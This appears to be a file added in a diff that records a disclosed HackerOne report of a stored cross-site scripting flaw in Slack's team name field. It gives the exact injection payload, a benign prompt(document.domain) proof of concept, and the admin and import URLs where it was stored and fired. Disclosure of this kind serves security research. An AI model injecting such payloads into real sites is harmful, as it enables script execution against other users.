@@ -1,0 +1,17 @@
+ReportLink:https://hackerone.com/reports/33018
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/securitythinker
+ReportedTo:Slack(slack)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:22.05.2016 15:07:38
+
+Summary:
+
+location of the stored xss bug :
+https://hunter22.slack.com/admin/name
+in team name :put this payload :"><img src=x onerror=prompt(document.domain)>
+
+stored xss executed here:
+https://hunter22.slack.com/services/import
